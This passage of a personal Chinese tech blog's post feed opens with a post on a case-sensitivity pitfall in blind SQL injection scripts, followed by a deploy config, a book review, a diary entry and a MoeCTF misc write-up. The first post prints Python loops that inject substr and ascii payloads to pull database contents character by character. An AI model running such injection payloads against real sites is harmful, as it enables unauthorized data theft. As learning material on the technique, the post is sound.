        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，SQL语句是不区分大小写的，这个特性在方便开发人员的同时也便利了黑阔们进行一个简单的绕过（比如大小写绕WAF），但我们今天的主题不是bypass，而是这个特性与盲注脚本碰撞所产生的一个坑。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>SQL不区分大小写，很多人可能会觉得：那又怎么样，不就是敲语句的时候方便些吗？然而这个特性直接造成’a’与’A’在SQL语句中是一样的，即’a’=’A’是成立的！</p><p><img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230214111209552.png" alt="image-20230214111209552" loading="lazy"></p><p>而盲注脚本中用substr逐个取字母出来比对则会受到这个特性的影响，又因为ASCII码的顺序是先大写字母再小写字母，所以在以下代码中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, information_length + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>)</span><br><span class="line">    payload = <span class="string">f&#x27; and substr((select <span class="subst">&#123;column_name&#125;</span> from <span class="subst">&#123;table_name&#125;</span> limit <span class="subst">&#123;y-<span class="number">1</span>&#125;</span>,1),<span class="subst">&#123;j&#125;</span>,1)=%27chr(k)%27&#x27;</span></span><br><span class="line">new_url = base_url + payload</span><br><span class="line">    <span class="keyword">if</span> flag_text <span class="keyword">in</span> requests.get(new_url).text.encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            information_name = information_name + <span class="built_in">chr</span>(k)</span><br></pre></td></tr></table></figure><p>ASCII码从小到大不断用取k出来，拿chr(k)和substr出来的字段名字母进行比较，结果会得到全部为大写的字段名（毕竟只要满足条件就开始匹配下一个字母了）</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>想要解决其实也很简单，全部使用ASCII码进行比较就可以了~（而且二分法也会用到这个）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, information_length + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                    payload = <span class="string">f&#x27; and ascii(substr((select <span class="subst">&#123;column_name&#125;</span> from <span class="subst">&#123;table_name&#125;</span> limit <span class="subst">&#123;y-<span class="number">1</span>&#125;</span>,1),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;k&#125;</span>&#x27;</span></span><br><span class="line">                    new_url = base_url + payload</span><br><span class="line">                    <span class="keyword">if</span> flag_text <span class="keyword">in</span> requests.get(new_url).text.encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                        information_name = information_name + <span class="built_in">chr</span>(k)</span><br></pre></td></tr></table></figure><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>摸了很久，所以接下来一周会多写几篇和SQL有关的博客（大概</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>SQL语句不区分大小写，但是数据库里的数据还是区分大小写的，也就是说，如果数据库里的表名是’flag’，在SQL语句中用where table_name=’Flag’ 的条件进行筛选，匹配不了数据库里的’flag’</p><p>我所说的SQL语句不区分大小写仅限于SQL语句中的判断条件，SQL语句认为’a’=’A’，用户输入的’flag’和’Flag’它只会原封不动地传给数据库进行比对，而在数据库里就有了区分~</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 SQL注入 python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>autopush</title>
      <link href="/2022/08/22/autopush/"/>
      <url>/2022/08/22/autopush/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>利用Github action，实现修改网站源代码后，自动执行生成静态页面＋部署改变到github pages的操作（无后端静态页面）  代码如下：</p><table><thead><tr><th>name: Hexo Deploy Automatically</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td>on:</td></tr><tr><td></td><td>push:</td></tr><tr><td></td><td>branches:</td></tr><tr><td></td><td>- hexo # 网站源码所在分支名称</td></tr><tr><td></td><td></td></tr><tr><td></td><td>pull_request:</td></tr><tr><td></td><td>branches:</td></tr><tr><td></td><td>- hexo # 网站源码所在分支名称</td></tr><tr><td></td><td></td></tr><tr><td></td><td>jobs:</td></tr><tr><td></td><td>build:</td></tr><tr><td></td><td></td></tr><tr><td></td><td>runs-on: ubuntu-latest</td></tr><tr><td></td><td></td></tr><tr><td></td><td>strategy:</td></tr><tr><td></td><td>matrix:</td></tr><tr><td></td><td>node-version: [16.x]</td></tr><tr><td></td><td></td></tr><tr><td></td><td>steps:</td></tr><tr><td></td><td>- name: Checkout</td></tr><tr><td></td><td>uses: actions/checkout@v2</td></tr><tr><td></td><td></td></tr><tr><td></td><td>- name: Use Node.js $NaN</td></tr><tr><td></td><td>uses: actions/setup-node@v1</td></tr><tr><td></td><td>with:</td></tr><tr><td></td><td>node-version: $NaN</td></tr><tr><td></td><td></td></tr><tr><td></td><td>- name: Generate</td></tr><tr><td></td><td>run: |</td></tr><tr><td></td><td>npm i &amp;&amp; npx hexo g</td></tr><tr><td></td><td></td></tr><tr><td></td><td>- name: Deploy</td></tr><tr><td></td><td>uses: peaceiris/actions-gh-pages@v3</td></tr><tr><td></td><td>with:</td></tr><tr><td></td><td>github_token: $</td></tr><tr><td></td><td>publish_branch: main # 静态页面代码(即部署在Github Pages上的代码)所在分支名称</td></tr><tr><td></td><td>publish_dir: ./public</td></tr><tr><td></td><td>force_orphan: true</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 技术 博客 自动部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>back</title>
      <link href="/2022/08/22/back/"/>
      <url>/2022/08/22/back/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>WHOCANSEE IS BACK</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《图解HTTP》读书笔记</title>
      <link href="/2021/11/24/HTTP/"/>
      <url>/2021/11/24/HTTP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>先给出一个总的夸奖, <strong>这是一本对并不求根问底的技术小白来说绝佳的Web入门书籍</strong></p><p>再给出个人的评价, <strong>这是一本对求甚解的技术小白来说有点痛苦的Web入门书籍</strong> PS(如果你还未读过本书,请看到最后,我会给出个人的阅读建议)</p><p>why,这是这本书与此有关的几大特点:</p><ul><li>小结构(即每个大章节内部的分支)十分严谨清晰,大结构(即整书11个大章节的关系)较为丰富(<strong>是说有点混乱</strong>)   具体来说, 本书除了讲解HTTP以外,还涉及了简单的Web知识(如HTML CSS等构建Web页面内容的技术 如基于表单的Web应用认证 如常见的Web攻击技术) 事实上,本书的一大侧重点就是Web安全方面的内容,所以如果你已经对这方面内容有了初步概念,或是对此感兴趣,这本《图解HTTP》还是非常适合你的</li><li>部分内容的翻译<strong>令人汗颜</strong>, 首先本书是没有严重的翻译错误的, 译者的专业身份(上海交通大学硕士)也为这点提供了有力保障,但我不知是否日文书译作中文时存在无法避免的难题,本书中出现了很多语法十分怪异的句子,乍一看我竟理解不了**”某些短语究竟是定语还是宾语** “<strong>这个句子的主干是什么?”</strong> 并且有几处已经严重影响到了我对于HTTP协议一些关键部分的理解,后经过前后文比对推断和查阅资料后才弄明白那些句子究竟想表达什么,如果各位对书中某些地方有疑问也可以联系我的电邮.</li><li>本书内容是很全面的,甚至对有些比较复杂深入的内容也进行了介绍(比如认证那节),这其实和本书的入门定位产生了冲突,因为要求了许多前置知识(<strong>事实上大部分都会在后面的章节提到</strong>)很多地方我刚开始看的迷迷糊糊,查阅资料也一知半解,顿时产生了消极情绪,开始自我怀疑(毕竟这只是本入门技术书籍,如果连这本书都看不太懂,那我的水平似乎是过低了)后来断断续续的往后看了下去,在了解了后续某些关键内容后<strong>顿觉豁然开朗</strong>,并且懊悔自己在本书前面部分内容耽误了太多时间,现在回过头乐观想想,阅读这本书的过程也提示了我  <strong>先粗略浏览建立整体认识,再于实战中遇到问题时不断返回细致学习   的高效率学习新知识方法</strong>,实在是很有意义.</li></ul><p><strong>最后的话</strong></p><p>​    本篇笔记写到最后,自然不会是感言之类的话. 我简单给出这本书的阅读建议吧</p><ul><li>什么样的人适合阅读这本书?<ul><li>对计算机网络 协议 Web HTTP 感兴趣的同学</li><li>计算机大类专业的同学</li><li>零基础或少基础的技术小白</li><li>没有系统学习过HTTP的同学</li></ul></li><li>如何高效地通过这本《图解HTTP》来学习HTTP相关知识?<ul><li>先用3天粗略读过,遇到不解的地方做上标记,在大量罗列首部及其对应作用的部分略过,对HTTP建立起整体印象.</li><li>回过头看看不解的地方,此时还没想通的部分优先在脑海中搜寻答案,想想这本书中是否就已经具有了解答,如果实在不解再试着使用搜索引擎或技术论坛/社群,若是问题较为复杂也可放弃,毕竟牵涉到的有些内容是属于另一需要循序渐进学习的领域,现在理解不了也正常.</li><li>实践,通过wireshark或浏览器开发者模式下Ctrl+R进行抓包,尝试读懂数据包各项指标的含义,遇见不明白的地方同第二点解决方法.</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VS 2022的一次错误</title>
      <link href="/2021/10/17/%E4%B8%80%E6%AC%A1%E9%97%AE%E9%A2%98/"/>
      <url>/2021/10/17/%E4%B8%80%E6%AC%A1%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>七星最近听说VS 2022预览版出了,我果断下载尝鲜,结果遇到了这样的问题:</p><p>#include &lt;stdio.h&gt; 报错 提示C1083:无法打开包括文件 &lt;stdio.h&gt;</p><p>解决方法很简单,退回VS2019(bushi)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>whocansee 个人介绍</title>
      <link href="/2021/09/27/whocansee/"/>
      <url>/2021/09/27/whocansee/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>小伙伴,你好啊,欢迎来到我的博客,请容我介绍一下自己~</p><p>我本名HJW,ID为whocansee,在网上冲浪有时也会用 『七星』作为自己的昵称</p><p>SEC,Coding是兴趣,课业是工作,二者合起来的学业就是我苦逼的一周TAT</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一日重返</title>
      <link href="/2021/09/27/%E8%AE%B0%E4%B8%80%E6%97%A5%E9%87%8D%E8%BF%94/"/>
      <url>/2021/09/27/%E8%AE%B0%E4%B8%80%E6%97%A5%E9%87%8D%E8%BF%94/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="学校"><a href="#学校" class="headerlink" title="学校"></a>学校</h2><p>7月6日，学校统一组织高三毕业学生返校领取毕业证。借此机会，班上组织了高三最后一次也是第一次（bushi）的团建活动。破天荒提前到了（笑）</p><p>  没多久便是规定集合时间，前方传来班主任的声音，我抬头，讲台上的老师正催促着大家联系一位迟到的同学，一切似乎与平时并无二致，唯一不同的是我没迟到（笑）                                                    好在那位同学很快就来到班上，老师也开始了最后的讲话。我收起了手机，目光转移到老师身上，许多同学也做着和我一样的动作，大家都很珍惜最后一次被老师念叨，这种默契是蝉噪无法穿透的。可惜的是，这一次，她没再说上好几分钟。</p><h2 id="周边-便利店"><a href="#周边-便利店" class="headerlink" title="周边(便利店)"></a>周边(便利店)</h2><p>   一进店，和我熟识的阿姨就问起了我的去向，我答道：”去西安念大学。“ ”西安？这么远啊！“她发出了和我家人一样的惊呼。我不知道该说什么，只是往里走拿了一瓶水，出来结账时，阿姨说：”这是你最后一次来了吧，下一次你来都要好几年后了。”几年后都不一定……“  我心里叹着，走出了店。           校外的街道,蝉声似乎更加烦躁，烈日也变得愈发灼人，我喝了一口刚买的冰水。</p><p>前去聚餐地点半路，忽然想起还要去拿快递，于是改道.  </p><h2 id="周边-驿站"><a href="#周边-驿站" class="headerlink" title="周边(驿站)"></a>周边(驿站)</h2><p>那家菜鸟驿站还是老样子，我推开门进去，老板还是那么热心，一看到我就掏出了早已准备好的快递，”雨飘的是吧，过期好几天都没来取，我给你收好了。“ 我接过快递，随口说：”这应该是我最后一次来拿快递了。“ ”为啥啊？“他问。”因为我考完了“ ”上哪个大学啊？“ ”XXXXXX大学“我答道。”这大学不错！“老板盛赞。我笑笑,和老板道别,走出了驿站，天突然凉了下来，蝉声也没那么扰人了.</p><h2 id="班级聚餐＆KTV"><a href="#班级聚餐＆KTV" class="headerlink" title="班级聚餐＆KTV"></a>班级聚餐＆KTV</h2><p>​                                                这一段貌似当初就没写,那我继续空着了()</p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p> 走出生源大门，抄近道来到距家最后一个十字路口， 孤立在红绿灯旁。迎面洒下的是万丈光辉，来往的车辆和行人身上闪烁着点点金光。信号转绿，我迈步沿着人行道走去，与上一秒还贴得很近的人们分别，错过。我想起了最后一课上班主任的嘱托：“祝贺你们进入了人生的新阶段。”</p><p>  是的，每个人的人生就像一条不断变化的道路，在某时某刻， 一群人的道路发生了交汇，各自产生了交集，互相影响了对方的未来。但随着时间推移，那群人之中的老师也好，同学也罢，每个人的道路终将四散开来，再与新的一群人发生交汇，再分离…..</p><p>  我希望，大家都能够向过去告别，朝未来出发。在永不停息的聚散之中， 延展出属于自己的未来。</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 回忆 感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 MoeCTF WP By whocansee</title>
      <link href="/2021/09/26/MoeCTF-2021-WP-BY-whocansee/"/>
      <url>/2021/09/26/MoeCTF-2021-WP-BY-whocansee/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><blockquote><p>本人其它方向水平实在有限,这次就先写MISC类吧</p></blockquote><ul><li><p>find_me</p><p>​    签到题,把题目给的文件放进010editor里搜一下ctf就可以了</p></li><li><p>Macross</p><p>​    必应搜索题给文件后缀名,发现属于宏脚本文件,下载对应的程序,把文件放进去运行即得flag    </p></li><li><p>Homework</p><p>​    题目给的是word文档,我拿到后打开,发现了歌颂网络安全的一大段文字,尝试打开了隐藏文字</p><p>​    啥也看不见,咋回事?  后来查资料发现隐藏文字在<strong>白色背景</strong>下显示不出来,所以打开了<strong>护眼背景</strong></p><p>​    顺利发现一处异常,试着复制下来粘贴在Notepad上,找到<strong>一截</strong>flag</p><p><a href="https://imgtu.com/i/4clxx0"><img src="https://z3.ax1x.com/2021/09/26/4clxx0.png" alt="4clxx0.png" loading="lazy"></a></p></li></ul><p><a href="https://imgtu.com/i/4c1PZF"><img src="https://z3.ax1x.com/2021/09/26/4c1PZF.png" alt="4c1PZF.png" loading="lazy"></a></p><blockquote><p>​    没错,真的是**<u>一截</u>**</p></blockquote><p>从这里开始就陷入怪圈了,忙活了许久也没发现答案,遂暂时放下   </p><p>后来知识(<del>套路</del>)增进以后想到会不会是文档包含了其它的东西,于是拖进010editor中分析,发现文件头是zip的50 4B 03 04,于是改后缀名为zip解压缩</p><blockquote><p>这时我还不会用Kali = =</p></blockquote><p><a href="https://imgtu.com/i/4c1ia4"><img src="https://z3.ax1x.com/2021/09/26/4c1ia4.png" alt="4c1ia4.png" loading="lazy"></a></p><p>得到这些东西,每个文件夹都看了一遍,一时也没想出下一步咋办</p><p>后来偶然看到一篇WP,里面的做法是打开word文件夹内的documents.xml文件,搜索flag,得到了答案</p><p>我照做,但并没有直接得到flag</p><p><a href="https://imgtu.com/i/4clv2q"><img src="https://z3.ax1x.com/2021/09/26/4clv2q.png" alt="4clv2q.png" loading="lazy"></a>            根据xml的特点,查找w:t  将符合格式的字符串多次拼接后得到最终flag</p><blockquote><p>PS:我到最后仍未理解Hint中的字数不够和隐藏文字有啥联系(因为隐藏文字不算word字数)</p></blockquote><ul><li><p>flipflipflip</p><p>​    分析题目后,整了个导图</p><p>​    <img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006163140530.png" alt="image-20211006163140530" loading="lazy"></p><p>​    等到操作起来,发现真正卡壳的地方完全不在图上…….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\who&#x27;can&#x27;se&#x27;e\Desktop\CTF\TASK\task.txt&quot;</span>).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">m = <span class="string">&quot;moectf&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="built_in">str</span>(s, encoding=<span class="string">&#x27;utf-8&#x27;</span>).startswith(m):</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">        s=base64.b64decode(s)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">        s = s[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;answer.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="built_in">str</span>(s,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这是我改进许久后的一段代码,但仍然在输出文本为700多K大小时进行不下去了,以下是报错代码</p><p><img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006163712648.png" alt="image-20211006163712648" loading="lazy"></p><p>查资料<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006163910694.png" alt="image-20211006163910694" loading="lazy"></p><p><img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006164207282.png" alt="image-20211006164207282" loading="lazy"></p><p>但我用的就是UTF-8啊,这咋办?</p></li><li><p>white album</p><blockquote><p>​    又是白色相簿的季节~</p></blockquote><p>打开图片,发现是white album galgame的插图,没看出什么玄机,于是拿StegSolve试试,结果左右摁了半天都没发现异样</p><p>看了一些WP后察觉到可能是宽高被修改过的问题,于是拿出010Editor查看,发现宽高果然不一样,修改后得到完整图片</p><p>下面多了一截二维条码,然而当时无知的我还以为是二维码的五个部分,于是臆想五部分＋三个角＋一个地方随便放</p><p>拼接成二维码,歪歪扭扭的裁剪下来后发现了一个严重的问题:拼接顺序,后无法解决,询问Noah学长后得知没有这么复杂</p><blockquote><p>​    错误的灵感来自于某些中间部分拿图标挡住的商业二维码</p></blockquote><p>卡壳后不死心,拿支付宝扫了下这个码,出乎意料的是竟然能扫描,但呈现出来的页面是”您的彩票失效了”,查找关键字发现</p><p>这意味着解码错误,我忽然间想到会不会是这个码非常特殊,支付宝用了解析别的码的方式解析它导致出错,说干就干,我查</p><p>了常见二维条码,功夫不负有心人,最终发现了此类条码的名字,随后花费半小时找到对应的解码工具,拿到Flag~</p></li><li><p>Phone Call</p><blockquote><p>​    题目的简介把我逗乐了,笑了好一会儿</p></blockquote><p>题目的意思还是比较明确的,要求把拨号声转换为真实的号码,我搜索关键字后得到了许多原理剖析文章,但我要的不是这个,</p><p>而是现成能用的工具———————————–</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc 解题报告 CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
